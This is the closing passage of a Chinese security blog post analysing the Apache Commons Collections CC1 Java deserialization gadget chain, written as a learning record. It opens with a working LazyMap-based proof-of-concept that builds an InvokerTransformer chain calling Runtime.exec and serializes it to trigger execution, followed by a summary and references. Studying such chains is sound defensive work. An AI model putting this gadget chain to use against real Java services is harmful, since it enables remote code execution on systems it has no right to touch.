Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                //反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                //反射调用exec方法，并执行该方法</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        //通过链转换器进行循环调用transformers数组</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        //创建LazyMap对象调用decorate回调方法</span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        //反射调用AnnotationInvocationHandler类</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        //创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        //创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        //通过代理调用代理对象，执行invoke方法</span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        //序列化InvocationHandler对象</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;exp.ser&quot;));</span><br><span class="line">        out.writeObject(invohandlerproxy);</span><br><span class="line">        //反序列化触发漏洞</span><br><span class="line">        ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;exp.ser&quot;));</span><br><span class="line">        input.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-42.png" title="执行POC"></p>
<h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>整体来说就是找到能够执行恶意函数的方法，然后一步步查看调用链，最后找到反序列化入口，cc1链看下来就比URL链复杂很多，链路调用步骤多了很多，有些链的类还需要明白怎么实现的，LazyMap加了动态代理然后调用链更绕。<br>分析单从完整利用链来推导相对容易很多，但会错过很多细节以及实现原理，可能会导致当时看完明白了过后过了段时间再回想就没法理清完整的利用链，这次分析的过程花费了不少的时间，中间有很多原理细节琢磨了有点久，只是记了我认为需要细理解的地方，可能还有些小细节没些或者被跳过了没注意，后面再看到的话再补充进来吧。</p>
<h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a><br>P牛-Java漫谈</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://Okaytc.github.io">Okaytc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://okaytc.github.io/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/">https://okaytc.github.io/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Okaytc.github.io" target="_blank">Okaytc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="post-meta__tags" href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/">java利用链</a></div><div class="post_share"><div class="social-share" data-image="/img/bg3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"><img class="next-cover" src="/img/bg3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java安全-URLDNS链学习与分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/" title="java安全-URLDNS链学习与分析"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-25</div><div class="title">java安全-URLDNS链学习与分析</div></div></a></div><div><a href="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/" title="java安全-初识java反射"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">java安全-初识java反射</div></div></a></div><div><a href="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java安全-初识反序列化"><img class="cover" src="/img/bg3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-27</div><div class="title">java安全-初识反序列化</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Okaytc</div><div class="author-info__description">生活 健身 学习 沉淀</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Okaytc"><i class="fab fa-github"></i><span>Github</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">分享一些漏洞分析、复现、相关工具使用等学习文章，当作是学习记录吧，一周一篇提醒自己。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81Apache-Commons-Collections%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x01、Apache Commons Collections描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text">0x02、环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E5%88%A9%E7%94%A8%E9%93%BE%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%AE%9E%E7%8E%B0%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">0x03、利用链接口及实现类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer%E6%8E%A5%E5%8F%A3"><span class="toc-number">4.1.</span> <span class="toc-text">Transformer接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ChainedTransformer%E7%B1%BB"><span class="toc-number">4.2.</span> <span class="toc-text">ChainedTransformer类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">4.3.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">4.4.</span> <span class="toc-text">InvokerTransformer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81CC1%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">0x04、CC1链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap%E9%93%BE"><span class="toc-number">5.1.</span> <span class="toc-text">TransformedMap链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">5.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">5.1.2.</span> <span class="toc-text">完整利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC"><span class="toc-number">5.1.3.</span> <span class="toc-text">构造POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LazyMap%E9%93%BE"><span class="toc-number">5.2.</span> <span class="toc-text">LazyMap链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">完整利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC-1"><span class="toc-number">5.2.3.</span> <span class="toc-text">构造POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x05、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">0x06、参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/" title="java安全-CC1链学习与分析">java安全-CC1链学习与分析</a><time datetime="2022-11-09T06:36:59.000Z" title="发表于 2022-11-09 14:36:59">2022-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/25/java%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/" title="java安全-URLDNS链学习与分析">java安全-URLDNS链学习与分析</a><time datetime="2022-10-25T07:36:59.000Z" title="发表于 2022-10-25 15:36:59">2022-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/18/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86java%E5%8F%8D%E5%B0%84/" title="java安全-初识java反射">java安全-初识java反射</a><time datetime="2022-10-18T07:36:59.000Z" title="发表于 2022-10-18 15:36:59">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/" title="记一次普通的攻击溯源排查">记一次普通的攻击溯源排查</a><time datetime="2022-10-11T15:00:00.000Z" title="发表于 2022-10-11 23:00:00">2022-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java安全-初识反序列化">java安全-初识反序列化</a><time datetime="2022-09-27T07:36:59.000Z" title="发表于 2022-09-27 15:36:59">2022-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/bg3.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 By Okaytc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
      appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>